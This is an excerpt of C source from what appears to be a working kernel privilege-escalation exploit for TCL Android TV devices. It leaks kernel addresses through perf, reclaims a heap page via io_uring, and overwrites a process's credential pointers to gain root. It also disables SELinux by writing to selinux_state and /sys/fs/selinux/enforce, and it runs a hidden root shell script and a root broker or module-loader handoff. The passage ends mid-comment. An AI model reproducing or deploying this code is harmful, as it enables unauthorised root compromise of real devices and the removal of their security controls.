    pr_info("selinux_state candidate[%d]: %016lx (%d votes) [anchor+%016lx]\n",
            i, (unsigned long)out[i], ranked_cnt[i],
            (unsigned long)(out[i] - kaslr_base));
  }
  return nrank;
}

struct tcl_victim_control {
  atomic_uint command_seq;
  atomic_uint response_seq;
  atomic_uint task_ready;
  uint32_t command;
  uint32_t response;
  uintptr_t task;
};

struct child_pipes {
  int task_r, task_w, cmd_r, cmd_w, uid_r, uid_w;
  struct tcl_victim_control *control;
};
static void child_main(struct child_pipes *p);

static void child_main(struct child_pipes *p) {
  close(p->task_r); close(p->cmd_w); close(p->uid_r);
  uintptr_t my_task = perf_find_task();
  write(p->task_w, &my_task, sizeof(my_task));
  close(p->task_w);
  if (!my_task) _exit(1);
  char cmd;
  while (read(p->cmd_r, &cmd, 1) == 1) {
    if (cmd == 'C') { uint32_t uid = getuid(); write(p->uid_w, &uid, sizeof(uid)); }
    else if (cmd == 'G') break;
  }
  close(p->cmd_r); close(p->uid_w);
  if (getuid() != 0) _exit(1);
  pid_t gc = fork();
  if (gc == 0) {
    int efd = open("/sys/fs/selinux/enforce", O_WRONLY);
    if (efd >= 0) { write(efd, "0", 1); close(efd); }
    execl("/system/bin/sh", "sh", "/data/local/tmp/.ghostlock_root.sh", NULL);
    _exit(1);
  }
  if (gc < 0) _exit(1);
  int status = 0;
  while (waitpid(gc, &status, 0) < 0) {
    if (errno == EINTR) continue;
    _exit(1);
  }
  if (WIFEXITED(status)) _exit(WEXITSTATUS(status));
  if (WIFSIGNALED(status)) _exit(128 + WTERMSIG(status));
  _exit(1);
}

static pid_t spawn_child(struct child_pipes *p) {
  int p1[2], p2[2], p3[2];
  if (pipe(p1) < 0 || pipe(p2) < 0 || pipe(p3) < 0) return -1;
  p->task_r = p1[0]; p->task_w = p1[1];
  p->cmd_r = p2[0]; p->cmd_w = p2[1];
  p->uid_r = p3[0]; p->uid_w = p3[1];
  pid_t child = fork();
  if (child < 0) return -1;
  if (child == 0) { child_main(p); _exit(1); }
  close(p->task_w); close(p->cmd_r); close(p->uid_w);
  return child;
}

/* TCL's credential is built inside the reclaimed io_uring page.  A normal
 * pre-exploit fork would not inherit the descriptors opened later by the
 * reclaim, and the credential would become a dangling pointer when the
 * exploit parent exits.  The dedicated victim therefore shares only the
 * file table (not the address space or thread group) with the parent.  Its
 * later ordinary fork() both normalizes cred/real_cred through copy_creds()
 * and copies the now-populated file table into the broker worker. */
static void park_tcl_root_victim(void) {
  int fd = open("/proc/self/oom_score_adj", O_WRONLY | O_CLOEXEC);
  if (fd >= 0) {
    (void)write(fd, "-1000", 5);
    close(fd);
  }
  for (;;) pause();
}

static void tcl_shared_victim_main(struct child_pipes *p) {
  char broker_path[512] = {0};
  char broker_uid[16] = "1000";
  char broker_name[80] = "tcl_root_broker_test";
  char resukisu_handoff[512] = {0};
  char resukisu_preflight[512] = {0};
  char resukisu_ksud[512] = {0};
  char resukisu_module[512] = {0};
  char resukisu_status[512] = {0};
  const char *v;

  /* Cache all strings while the task still has its original credential. */
  v = getenv("GHOST_DIRECT_BROKER");
  if (!v || !v[0]) v = getenv("TCL_QEMU_SESSION_BROKER");
  if (v && v[0]) snprintf(broker_path, sizeof(broker_path), "%s", v);
  v = getenv("GHOST_BROKER_UID");
  if (v && v[0]) snprintf(broker_uid, sizeof(broker_uid), "%s", v);
  v = getenv("GHOST_BROKER_ABSTRACT");
  if (!v || !v[0]) v = getenv("TCL_QEMU_SESSION_NAME");
  if (v && v[0]) snprintf(broker_name, sizeof(broker_name), "%s", v);
  v = getenv("GHOST_RESUKISU_HANDOFF");
  if (v && v[0]) snprintf(resukisu_handoff, sizeof(resukisu_handoff), "%s", v);
  v = getenv("GHOST_RESUKISU_PREFLIGHT");
  if (v && v[0]) snprintf(resukisu_preflight, sizeof(resukisu_preflight), "%s", v);
  v = getenv("GHOST_RESUKISU_KSUD");
  if (v && v[0]) snprintf(resukisu_ksud, sizeof(resukisu_ksud), "%s", v);
  v = getenv("GHOST_RESUKISU_MODULE");
  if (v && v[0]) snprintf(resukisu_module, sizeof(resukisu_module), "%s", v);
  v = getenv("GHOST_RESUKISU_STATUS");
  if (v && v[0]) snprintf(resukisu_status, sizeof(resukisu_status), "%s", v);

  (void)setpgid(0, 0);
  (void)prctl(PR_SET_NAME, "tcl_gl_victim", 0, 0, 0);

  /* A false perf winner would turn W2 into an arbitrary kernel write.  Two
   * independent samples must agree exactly before the address is published. */
  uintptr_t my_task = perf_find_task();
  int agreed = 0;
  for (int i = 0; i < 2 && my_task; i++) {
    uintptr_t again = perf_find_task();
    if (again == my_task) {
      agreed = 1;
      break;
    }
    my_task = again;
  }
  if (!agreed) my_task = 0;
  p->control->task = my_task;
  atomic_thread_fence(memory_order_release);
  atomic_store_explicit(&p->control->task_ready, 1, memory_order_release);
  if (!my_task) _exit(1);

  /* Do not block in a pipe read while W2 replaces task->cred.  On the TCL
   * kernel that in-flight read returns an internal error after the cred
   * transition, although the same sequence succeeds under QEMU.  Commands
   * and replies therefore use this MAP_SHARED atomic mailbox.  The short
   * raw nanosleep only yields the CPU; its return value is irrelevant. */
  uint32_t seen_seq = 0;
  int broker_requested = 0;
  for (;;) {
    uint32_t command_seq;
    do {
      command_seq = atomic_load_explicit(&p->control->command_seq,
                                         memory_order_acquire);
      if (command_seq == seen_seq) {
        struct timespec pause = {.tv_sec = 0, .tv_nsec = 1000000};
        (void)syscall(__NR_nanosleep, &pause, NULL);
      }
    } while (command_seq == seen_seq);
    char cmd = (char)p->control->command;
    seen_seq = command_seq;

    if (cmd == 'C') {
      uint32_t uid = (uint32_t)syscall(__NR_getuid);
      p->control->response = uid;
      atomic_thread_fence(memory_order_release);
      atomic_store_explicit(&p->control->response_seq, seen_seq,
                            memory_order_release);
    } else if (cmd == 'P') {
      uint32_t report = 0x50494e47u; /* "PING" */
      p->control->response = report;
      atomic_thread_fence(memory_order_release);
      atomic_store_explicit(&p->control->response_seq, seen_seq,
                            memory_order_release);
    } else if (cmd == 'U') {
      errno = 0;
      long rc = syscall(__NR_unshare, CLONE_FILES);
      uint32_t report = rc == 0 ? 0x554e5348u : (uint32_t)errno;
      p->control->response = report;
      atomic_thread_fence(memory_order_release);
      atomic_store_explicit(&p->control->response_seq, seen_seq,
                            memory_order_release);
    } else if (cmd == 'G') {
      broker_requested = 1;
      break;
    } else if (cmd == 'X') {
      if (getuid() == 0) {
        if (raw_selinux_enforcing() != 1)
          raw_emergency_reboot_or_park();
        park_tcl_root_victim();
      }
      _exit(1);
    }
  }

  /* Only an explicit G may cross this boundary. */
  int resukisu_requested = resukisu_handoff[0] && resukisu_preflight[0] &&
                           resukisu_ksud[0] && resukisu_module[0] &&
                           resukisu_status[0];
  if (!broker_requested || syscall(__NR_getuid) != 0 ||
      (!broker_path[0] && !resukisu_requested))
    _exit(121);

  /* Do not exec from this raw victim: task->cred is the fake credential but
   * task->real_cred is still the original one.  fork() invokes copy_creds(),
   * producing a worker whose two pointers reference one legitimate copied
   * credential.  Because this process shares the exploit parent's file
   * table, that worker also inherits the io_uring descriptors which keep the
   * fake credential and its supporting objects alive. */
  int completion_pipe[2] = {-1, -1};
  if (resukisu_requested && pipe(completion_pipe) != 0) {
    raw_emergency_reboot_or_park();
  }

  pid_t worker = fork();
  if (worker == 0) {
    char holder_pid[16];
    snprintf(holder_pid, sizeof(holder_pid), "%d", (int)getppid());
    (void)setsid();
    if (resukisu_requested) {
      char completion_fd[16];
      close(completion_pipe[0]);
      snprintf(completion_fd, sizeof(completion_fd), "%d",
               completion_pipe[1]);
      execl(resukisu_handoff, resukisu_handoff,
            "--direct-child", "--preflight", resukisu_preflight,
            "--ksud", resukisu_ksud, "--module", resukisu_module,
            "--status", resukisu_status,
            "--completion-fd", completion_fd, (char *)NULL);
      _exit(127);
    }
    execl(broker_path, broker_path,
          "--direct-child", "--uid", broker_uid,
          "--abstract", broker_name,
          "--arm-timeout-ms", "60000",
          "--holder-pid", holder_pid,
          "--reboot-after-ms", "45000", (char *)NULL);
    _exit(127);
  }
  if (resukisu_requested) close(completion_pipe[1]);
  uint32_t report = worker > 0 ? (uint32_t)worker : 0;
  p->control->response = report;
  atomic_thread_fence(memory_order_release);
  atomic_store_explicit(&p->control->response_seq, seen_seq,
                        memory_order_release);
  if (worker < 0) {
    if (completion_pipe[0] >= 0) close(completion_pipe[0]);
    raw_emergency_reboot_or_park();
  }

  /* ReSukiSU is a one-shot handoff, not a long-lived broker.  Keep the W2
   * reclaim descriptors pinned while the normalized helper completes its
   * policy/network repair, module load and enforcing restoration.  The raw
   * victim must remain parked afterwards too: exit_creds() would otherwise
   * release a credential still backed by the reclaimed page.  Reboot is the
   * sole cleanup boundary. */
  if (resukisu_requested && worker > 0) {
    /* waitpid() is not a lifetime primitive for the raw W2 task: TCL has
     * already shown that a syscall in flight across the credential rewrite
     * can return an internal error.  The normalized helper therefore owns
     * the only write end of this post-W2 pipe.  Its close-on-exec flag keeps
     * the fd out of preflight/ksud, and EOF proves the helper itself has
     * exited before the reclaim page is released. */
    char completion;
    for (;;) {
      long n = syscall(__NR_read, completion_pipe[0], &completion, 1);
      if (n == 0 || n == 1) break;
      if (n < 0 && errno == EINTR) continue;
      struct timespec pause = {.tv_sec = 0, .tv_nsec = 1000000};
      (void)syscall(__NR_nanosleep, &pause, NULL);
    }
    close(completion_pipe[0]);
    int status = 0;
    while (waitpid(worker, &status, 0) < 0) {
      if (errno == EINTR) continue;
      park_tcl_root_victim();
    }
    int worker_rc = WIFEXITED(status) ? WEXITSTATUS(status)
                                     : (WIFSIGNALED(status)
                                            ? 128 + WTERMSIG(status)
                                            : 125);
    /* Never infer from a return code that policycap/netlink repair happened:
     * argument, exec and early-kernel guards can fail before that point. */
    if (worker_rc != 0)
      raw_emergency_reboot_or_park();
    park_tcl_root_victim();
  }

  /* Stop retaining the Java/native launcher's stdout pipe.  unshare first:
   * close() on the still-shared table would also close the parent's fds.
   * The private copy continues to pin every reclaim descriptor. */
  if (syscall(__NR_unshare, CLONE_FILES) == 0) {
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
  }

  /* The raw victim owns the shared descriptor table and intentionally stays
   * alive for the volatile session.  Reboot is the cleanup boundary. */
  park_tcl_root_victim();
}

static pid_t spawn_tcl_shared_victim(struct child_pipes *p,
                                     uintptr_t *task_out) {
  p->task_r = p->task_w = p->cmd_r = p->cmd_w = -1;
  p->uid_r = p->uid_w = -1;
  p->control = mmap(NULL, sizeof(*p->control), PROT_READ | PROT_WRITE,
                    MAP_SHARED | MAP_ANONYMOUS, -1, 0);
  if (p->control == MAP_FAILED) {
    p->control = NULL;
    return -1;
  }
  memset(p->control, 0, sizeof(*p->control));

  long child = syscall(__NR_clone, (unsigned long)(CLONE_FILES | SIGCHLD),
                       0, 0, 0, 0);
  if (child < 0) return -1;
  if (child == 0) {
    tcl_shared_victim_main(p);
    _exit(1);
  }

  uintptr_t task = 0;
  /* Software-emulated QEMU needs roughly 30-45 s per perf sample storm;
   * the television completes it much faster. */
  for (int i = 0; i < 180000; i++) {
    if (atomic_load_explicit(&p->control->task_ready,
                             memory_order_acquire)) {
      atomic_thread_fence(memory_order_acquire);
      task = p->control->task;
      break;
    }
    struct timespec pause = {.tv_sec = 0, .tv_nsec = 1000000};
    (void)nanosleep(&pause, NULL);
  }
  *task_out = task;
  if (!task) {
    uint32_t seq = atomic_load_explicit(&p->control->command_seq,
                                        memory_order_relaxed) + 1;
    p->control->command = 'X';
    atomic_thread_fence(memory_order_release);
    atomic_store_explicit(&p->control->command_seq, seq,
                          memory_order_release);
  }
  return (pid_t)child;
}

static void tcl_log_victim_wait_state(pid_t victim_pid, const char *stage) {
  int status = 0;
  errno = 0;
  pid_t wr = waitpid(victim_pid, &status, WNOHANG);
  int saved_errno = errno;
  if (wr == 0) {
    pr_warning("TCL W2 IPC %s: victim pid=%d is alive but did not reply\n",
               stage, victim_pid);
  } else if (wr == victim_pid && WIFEXITED(status)) {
    pr_warning("TCL W2 IPC %s: victim pid=%d exited status=%d\n",
               stage, victim_pid, WEXITSTATUS(status));
  } else if (wr == victim_pid && WIFSIGNALED(status)) {
    pr_warning("TCL W2 IPC %s: victim pid=%d killed by signal=%d\n",
               stage, victim_pid, WTERMSIG(status));
  } else {
    pr_warning("TCL W2 IPC %s: waitpid=%d errno=%d\n",
               stage, (int)wr, saved_errno);
  }
}

static int tcl_victim_word(struct child_pipes *p, pid_t victim_pid,
                           char command, uint32_t *word_out,
                           const char *stage) {
  if (!p->control) {
    pr_warning("TCL W2 IPC %s: shared mailbox unavailable\n", stage);
    tcl_log_victim_wait_state(victim_pid, stage);
    return 0;
  }

  uint32_t seq = atomic_load_explicit(&p->control->command_seq,
                                      memory_order_relaxed) + 1;
  if (!seq) seq = 1;
  p->control->command = (uint32_t)(unsigned char)command;
  atomic_thread_fence(memory_order_release);
  atomic_store_explicit(&p->control->command_seq, seq,
                        memory_order_release);

  for (int i = 0; i < 5000; i++) {
    if (atomic_load_explicit(&p->control->response_seq,
                             memory_order_acquire) == seq) {
      atomic_thread_fence(memory_order_acquire);
      *word_out = p->control->response;
      return 1;
    }
    struct timespec pause = {.tv_sec = 0, .tv_nsec = 1000000};
    (void)nanosleep(&pause, NULL);
  }

  pr_warning("TCL W2 IPC %s: shared mailbox timeout command_seq=%u "
             "response_seq=%u\n", stage, seq,
             atomic_load_explicit(&p->control->response_seq,
                                  memory_order_acquire));
  tcl_log_victim_wait_state(victim_pid, stage);
  return 0;
}

static void tcl_victim_send(struct child_pipes *p, char command) {
  if (!p->control) return;
  uint32_t seq = atomic_load_explicit(&p->control->command_seq,
                                      memory_order_relaxed) + 1;
  if (!seq) seq = 1;
  p->control->command = (uint32_t)(unsigned char)command;
  atomic_thread_fence(memory_order_release);
  atomic_store_explicit(&p->control->command_seq, seq,
                        memory_order_release);
}

static int tcl_victim_ping(struct child_pipes *p, pid_t victim_pid,
                           const char *stage) {
  uint32_t report = 0;
  if (!tcl_victim_word(p, victim_pid, 'P', &report, stage)) return 0;
  if (report != 0x50494e47u) {
    pr_warning("TCL W2 IPC %s: bad ping reply=%#x\n", stage, report);
    return 0;
  }
  return 1;
}

static int tcl_victim_uid(struct child_pipes *p, pid_t victim_pid,
                          uint32_t *uid_out, const char *stage) {
  return tcl_victim_word(p, victim_pid, 'C', uid_out, stage);
}

static int tcl_victim_unshare_files(struct child_pipes *p,
                                    pid_t victim_pid) {
  uint32_t report = 0;
  if (!tcl_victim_word(p, victim_pid, 'U', &report, "unshare-files"))
    return 0;
  if (report != 0x554e5348u) {
    pr_warning("TCL victim CLONE_FILES unshare failed errno=%u\n", report);
    return 0;
  }
  pr_info("TCL victim owns a private descriptor table; W2 page pinned\n");
  return 1;
}

/* Capture the reclaim page before creating the victim.  A live victim mm
 * changes the exact SLUB population and made the QEMU/TV reclaim less
 * deterministic.  Once the page is pinned by io_uring, create the victim
 * with CLONE_FILES, learn its task address, rewrite the still-inactive
 * payload to that address, and only then fire the PI route. */
static int do_tcl_external_cred_write(struct child_pipes *pipes,
                                      pid_t *victim_pid,
                                      uintptr_t *victim_task,
                                      const char *desc) {
  pr_info("=== %s (capture-before-victim) ===\n", desc);
  ghost_reset_plans();
  g_route_write_ok = 0;
  pselect_child_node = 1;
  set_pselect_write_mode(g_leaked_task + TASK_CRED_OFF, 0,
                         WRITE_MODE_CRED);
  TIMER("  heap spray start");
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
  if (!page_base) {
    pr_warning("  heap spray failed or was refused by the capture gate\n");
    clear_pselect_write();
    return 0;
  }

  *victim_pid = spawn_tcl_shared_victim(pipes, victim_task);
  if (*victim_pid < 0 || !*victim_task) {
    pr_warning("  verified shared-files victim unavailable after capture\n");
    clear_pselect_write();
    return 0;
  }
  /* Prove the control channel before touching the victim credential.  This
   * turns a later missing reply into a post-write failure rather than an
   * ambiguous pipe/setup failure. */
  uint32_t pre_uid = UINT32_MAX;
  if (!tcl_victim_ping(pipes, *victim_pid, "pre-write-ping") ||
      !tcl_victim_uid(pipes, *victim_pid, &pre_uid, "pre-write-uid")) {
    pr_warning("  verified victim IPC unavailable before W2\n");
    tcl_victim_send(pipes, 'X');
    clear_pselect_write();
    return 0;
  }
  pr_info("  victim IPC verified before W2: pid=%d uid=%u\n",
          *victim_pid, pre_uid);
  set_pselect_write_mode(*victim_task + TASK_CRED_OFF, 0,
                         WRITE_MODE_CRED);
  if (!tcl_refresh_captured_page(page_base, PAGE_PAYLOAD_FOPS)) {
    tcl_victim_send(pipes, 'X');
    clear_pselect_write();
    return 0;
  }
  pr_info("  victim pid=%d task=%016lx target=%016lx\n", *victim_pid,
          (unsigned long)*victim_task,
          (unsigned long)(*victim_task + TASK_CRED_OFF));
  TIMER("  heap spray retargeted");
  g_tcl_external_cred_target = 1;
  run_main_route_threads();
  int attempts = env_int_range("TCL_W2_ATTEMPTS", 3, 1, 5);
  int force_retry = env_flag("TCL_W2_FORCE_RETRY", 0);
  if (g_route_write_ok && force_retry) {
    pr_info("TCL W2 forced retry gate: first landing accepted then "
            "re-armed for regression\n");
    g_route_write_ok = 0;
  }
  for (int attempt = 2; !g_route_write_ok && attempt <= attempts; attempt++) {
    if (!ghost_rearm_captured_write(*victim_task + TASK_CRED_OFF,
                                    page_base + FAKE_CRED_OFF)) {
      pr_warning("TCL W2 same-page re-arm failed attempt=%d/%d\n",
                 attempt, attempts);
      break;
    }
    g_tcl_split_settle_usec = 50000 + (attempt - 1) * 30000;
    pr_info("TCL W2 same-page carrier retry=%d/%d settle_us=%d\n",
            attempt, attempts, g_tcl_split_settle_usec);
    run_main_route_threads();
  }
  g_tcl_split_settle_usec = 50000;
  g_tcl_external_cred_target = 0;
  clear_pselect_write();
  return 1;
}

static int run_selftest(void) {
  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  if (!active_offsets && select_offsets() < 0) return 1;
  init_p0_profile();
  init_ashmem_path();
  pin_to_core(CORE);
  kaslr_base = KIMAGE_TEXT_BASE;
  if (active_offsets->kimage_text_base) kaslr_base = active_offsets->kimage_text_base;
  kaslr_done = 1;
  timer_reset();
  TIMER("exploit start");

  ghost_reset_plans();
  pr_info("selftest: mode 5 write into spray page\n");
  do_one_write(0, "selftest write", 5);
  pr_info("selftest result: %s (g_route_write_ok=%d)\n",
          g_route_write_ok ? "WRITE VERIFIED" : "write FAILED",
          g_route_write_ok);
  return g_route_write_ok ? 0 : 1;
}

#if defined(TCL_V643_LAB_ARMING) && TCL_V643_LAB_ARMING
#if defined(TCL_QEMU_EMBED_BROKER) && TCL_QEMU_EMBED_BROKER
extern int tcl_root_broker_main(int argc, char **argv);
#endif

/* QEMU-only gate for the final TCL handoff strategy.  It targets a
 * pre-spawned victim which shares the parent's descriptor table, then asks
 * that raw-root victim to fork a normalized broker worker.  The independent
 * page-local primitive gate is kept in the witness tests; repeating it here
 * only adds an unrelated timing race. /dev/glqemu-root exists only in the
 * disposable laboratory kernel and is never present on a TCL television. */
static int run_qemu_two_cycle_root(void) {
  struct tcl_qemu_root_layout {
    uint64_t page_kva;
    uint64_t current_task;
    uint64_t fake_cred;
    uint64_t sched_task_group;
    uint32_t page_order;
    uint32_t task_cred_off;
    uint32_t task_real_cred_off;
    uint32_t cred_size;
  } layout;
#define TCL_QEMU_GET_LAYOUT _IOR(0x47, 1, struct tcl_qemu_root_layout)

  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  if (!active_offsets && select_offsets() < 0) return 1;
  if (!active_offsets ||
      active_offsets->reclaim_route != GHOST_RECLAIM_TCL_V643_EXACT ||
      active_offsets->stack_overlay_route !=
          GHOST_STACK_OVERLAY_TCL_V643_NEWSELECT_COMPAT) {
    pr_error("QEMU two-cycle gate requires the exact TCL split profile\n");
    return 1;
  }
  init_p0_profile();
  init_ashmem_path();
  pin_to_core(CORE);
  kaslr_base = active_offsets->kimage_text_base;
  kaslr_done = 1;
  timer_reset();

  int qfd = open("/dev/glqemu-root", O_RDWR | O_CLOEXEC);
  memset(&layout, 0, sizeof(layout));
  if (qfd < 0 || ioctl(qfd, TCL_QEMU_GET_LAYOUT, &layout) != 0) {
    pr_error("QEMU layout observer unavailable errno=%d\n", errno);
    if (qfd >= 0) close(qfd);
    return 1;
  }
  void *qemu_probe = mmap(NULL, 0x4000, PROT_READ | PROT_WRITE,
                          MAP_SHARED, qfd, 0);
  close(qfd);
  if (qemu_probe == MAP_FAILED || !layout.current_task ||
      layout.page_order != 2 ||
      layout.task_cred_off != TASK_CRED_OFF ||
      layout.task_real_cred_off != TASK_REAL_CRED_OFF ||
      layout.cred_size != CRED15_SIZE) {
    pr_error("QEMU layout mismatch task=%016llx order=%u cred=%#x/%#x "
             "expected=%#x/%#x size=%u expected_size=%u\n",
             (unsigned long long)layout.current_task, layout.page_order,
             layout.task_cred_off, layout.task_real_cred_off,
             (unsigned)TASK_CRED_OFF, (unsigned)TASK_REAL_CRED_OFF,
             layout.cred_size, (unsigned)CRED15_SIZE);
    return 1;
  }
  const char *ns = getenv("TCL_QEMU_INIT_USER_NS");
  if (!ns || !ns[0]) {
    pr_error("TCL_QEMU_INIT_USER_NS is required by the QEMU gate\n");
    return 1;
  }
  g_init_user_ns_addr = strtoull(ns, NULL, 0);
  g_leaked_task = layout.current_task;
  if (!g_init_user_ns_addr) return 1;

  if (getuid() == 0 &&
      (setresgid(1000, 1000, 1000) != 0 ||
       setresuid(1000, 1000, 1000) != 0)) {
    pr_error("QEMU gate could not drop to uid/gid 1000 errno=%d\n", errno);
    return 1;
  }
  if (getuid() != 1000) {
    pr_error("QEMU gate must start unprivileged (uid=%d)\n", getuid());
    return 1;
  }

  pr_info("GLHANDOFF start uid=%d parent_task=%016llx init_user_ns=%016lx\n",
          getuid(), (unsigned long long)g_leaked_task,
          (unsigned long)g_init_user_ns_addr);

  struct child_pipes victim_pipes;
  memset(&victim_pipes, 0, sizeof(victim_pipes));
  uintptr_t victim_task = 0;
  pid_t victim_pid = -1;
  int w2_started = do_tcl_external_cred_write(
      &victim_pipes, &victim_pid, &victim_task,
      "QEMU victim credential root");
  if (!w2_started || !g_route_write_ok) {
    tcl_victim_send(&victim_pipes, 'X');
    pr_error("GLHANDOFF credential primitive failed; parent uid=%d\n", getuid());
    return 1;
  }
  uint32_t victim_uid = UINT32_MAX;
  if (!tcl_victim_ping(&victim_pipes, victim_pid, "post-write-ping") ||
      !tcl_victim_uid(&victim_pipes, victim_pid, &victim_uid,
                      "post-write-uid") ||
      victim_uid != 0) {
    tcl_victim_send(&victim_pipes, 'X');
    pr_error("GLHANDOFF did not root victim uid=%u parent_uid=%d\n",
             victim_uid, getuid());
    return 1;
  }
  if (!tcl_victim_unshare_files(&victim_pipes, victim_pid)) {
    tcl_victim_send(&victim_pipes, 'X');
    pr_error("GLHANDOFF victim could not pin W2 descriptors privately\n");
    return 1;
  }
  pr_success("GLHANDOFF W2 PASS: victim uid 1000 -> 0; parent remains uid=%d\n",
             getuid());

  uintptr_t reuse_target = layout.page_kva + SELFTEST_OFF;
  uintptr_t reuse_value = layout.page_kva + SELFTEST_VALUE;
  *(volatile uint64_t *)((uint8_t *)qemu_probe + SELFTEST_OFF) = 0;
  if (!do_tcl_reuse_captured_write(reuse_target, reuse_value,
                                   "QEMU same-page second write",
                                   WRITE_MODE_CRED_SELINUX) ||
      *(volatile uint64_t *)((uint8_t *)qemu_probe + SELFTEST_OFF) !=
          reuse_value) {
    tcl_victim_send(&victim_pipes, 'X');
    pr_error("GLHANDOFF same-page second write failed got=%016llx want=%016lx\n",
             (unsigned long long)*(volatile uint64_t *)(
                 (uint8_t *)qemu_probe + SELFTEST_OFF),
             (unsigned long)reuse_value);
    return 1;
  }
  uint32_t post_reuse_uid = UINT32_MAX;
  if (!tcl_victim_ping(&victim_pipes, victim_pid, "post-reuse-ping") ||
      !tcl_victim_uid(&victim_pipes, victim_pid, &post_reuse_uid,
                      "post-reuse-uid") ||
      post_reuse_uid != 0) {
    tcl_victim_send(&victim_pipes, 'X');
    pr_error("GLHANDOFF same-page write damaged W2 victim uid=%u\n",
             post_reuse_uid);
    return 1;
  }
  pr_success("GLHANDOFF SAME-PAGE PASS: second write landed; W2 victim remains uid=0\n");
  uint32_t broker_pid = 0;
  if (!tcl_victim_word(&victim_pipes, victim_pid, 'G', &broker_pid,
                       "broker-start") ||
      !broker_pid) {
    pr_error("GLHANDOFF normalized broker worker did not start\n");
    return 1;
  }
  pr_success("GLHANDOFF PASS: normalized broker worker pid=%u\n",
             broker_pid);
  return 0;
#undef TCL_QEMU_GET_LAYOUT
}
#endif

/* --cred: task_struct leak (perf regs) + KASLR base (perf min_ip) +
 * three-walk route (mode 7, default):
 *   walk 0: preserving pointer at selinux_state (enforcing=0,
 *           checkreqprot=0, initialized remains non-zero).  Its upper five
 *           bytes temporarily replace policycap[0..4], so the normalized
 *           handoff must reload+verify the live policy before setenforce(1).
 *   walk 1: task->cred = fake_cred (uid 0, caps FULL, self-contained
 *           fake user_namespace on the spray page)
 *   walk 2: task->real_cred = fake_cred (required: commit_creds() at
 *           execve BUG_ONs unless cred == real_cred)
 * All three erases run against ONE reclaimed page (the same-page overlay
 * retry rounds), consuming exactly the three rungs of the monotonic
 * nice ladder (0->7->14->19).
 * Falls back to mode 6 (cred + real_cred only) when the SELinux write
 * cannot be armed safely (no selinux_state offset, kaslr sanity failed,
 * or GHOST_SELINUX=0). */
static int run_cred_swap(void) {
  char direct_broker_path[512] = {0};
  char direct_broker_uid[16] = {0};
  char direct_broker_abstract[80] = {0};
  int direct_broker_enabled = 0;
  int direct_resukisu_enabled = 0;
  {
    const char *path = getenv("GHOST_DIRECT_BROKER");
    const char *uid = getenv("GHOST_BROKER_UID");
    const char *name = getenv("GHOST_BROKER_ABSTRACT");
    if (path && path[0] && uid && uid[0]) {
      snprintf(direct_broker_path, sizeof(direct_broker_path), "%s", path);
      snprintf(direct_broker_uid, sizeof(direct_broker_uid), "%s", uid);
      snprintf(direct_broker_abstract, sizeof(direct_broker_abstract), "%s",
               name && name[0] ? name : "tcl_root_broker");
      direct_broker_enabled = 1;
    }
    const char *handoff = getenv("GHOST_RESUKISU_HANDOFF");
    const char *preflight = getenv("GHOST_RESUKISU_PREFLIGHT");
    const char *ksud = getenv("GHOST_RESUKISU_KSUD");
    const char *module = getenv("GHOST_RESUKISU_MODULE");
    const char *status = getenv("GHOST_RESUKISU_STATUS");
    direct_resukisu_enabled = handoff && handoff[0] && preflight &&
                              preflight[0] && ksud && ksud[0] && module &&
                              module[0] && status && status[0];
  }
  int direct_handoff_enabled =
      direct_broker_enabled || direct_resukisu_enabled;
  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  if (!active_offsets && select_offsets() < 0) return 1;
  if (active_offsets &&
      active_offsets->reclaim_route == GHOST_RECLAIM_TCL_V643_EXACT &&
      !direct_handoff_enabled) {
    pr_error("TCL production root is fail-closed without a direct handoff; "
             "raw-root exec is forbidden\n");
    return 1;
  }
  init_p0_profile();
  init_ashmem_path();
  pin_to_core(CORE);
  kaslr_base = KIMAGE_TEXT_BASE;
  if (active_offsets->kimage_text_base) kaslr_base = active_offsets->kimage_text_base;
  kaslr_done = 1;
  timer_reset();
  TIMER("exploit start");

  /* 1. leak own task (this also recovers kaslr_base = runtime _text) */
  g_leaked_task = perf_leak_own_task();
  if (!g_leaked_task) {
    pr_error("task leak failed - cannot proceed\n");
    return 1;
  }
  pr_info("cred mode: task=%016lx (fake user_ns on spray page)\n",
          (unsigned long)g_leaked_task);

  /* 2. SELinux-off target (mode 7): the device kernel (ThinLTO/clang-17)
   * has .text+.rodata ~7.5MB LARGER than the reference vmlinux, so the
   * whole .data/.bss region shifts and the reference table offsets are
   * NOT device-valid (verified on device: the table-derived target lay
   * past the image end and faulted at rb_erase+0x74; the boot log shows
   * .data at device_text+0x1940000). The target is the boot-log-derived
   * DEVICE address baked into the table
   * (off_selinux_enforcing_device, anchor-relative), optionally
   * sanity-checked against the open-storm perf leak (informational -
   * the leak's candidates cluster around the derived address but the
   * vote signal is weak). The consumer's enforce readback after round 1
   * is the authoritative verification. */
  int selinux_mode = 0;
  {
    /* 1.5 The setpriority(-20) storm (both modes): RLIMIT_NICE=40 on this
     * device lets the calls succeed, parking the main thread (and every
     * thread it later creates) at nice -20 - a preemption shield for the
     * critical discard->capture window. The candidate census it prints
     * is diagnostic only (the reference-table init_user_ns match is a
     * known false positive on the device layout). */
    if (active_offsets->off_init_user_ns && kaslr_done) {
      validate_device_symbol_layout();
    }
    /* The REAL device &init_user_ns (device table, anchor-relative) -
     * set BEFORE the payload build (do_one_write -> prepare_skb_payload
     * -> fill_fake_cred_suite reads it): fake_cred->user_ns must point
     * here or every capable() call fails (CAP_DAC_OVERRIDE, CAP_SYSLOG,
     * ...) and the rooted thread cannot create files or exec. */
    if (active_offsets->off_init_user_ns_device && kaslr_done) {
      uintptr_t symbol_base = runtime_static_symbol_base();
      g_init_user_ns_addr = symbol_base +
                           active_offsets->off_init_user_ns_device;
      pr_info("device &init_user_ns = %016lx (symbol_base=%016lx +%016lx) - "
              "fake_cred->user_ns\n",
              (unsigned long)g_init_user_ns_addr,
              (unsigned long)symbol_base,
              (unsigned long)active_offsets->off_init_user_ns_device);
    } else {
      g_init_user_ns_addr = 0;
    }
  }
  if (active_offsets->off_selinux_enforcing_device && kaslr_done &&
      env_flag("GHOST_SELINUX", 1)) {
    g_selinux_target = runtime_static_symbol_base() +
                      active_offsets->off_selinux_enforcing_device;
    if ((g_selinux_target & 7) == 0) {
      /* Pair-agreement diagnostic: &selinux_avc sits exactly 0x1828
       * below &selinux_state in .bss in both the reference and the
       * device build (verified via the perf leak across boots). Seeing
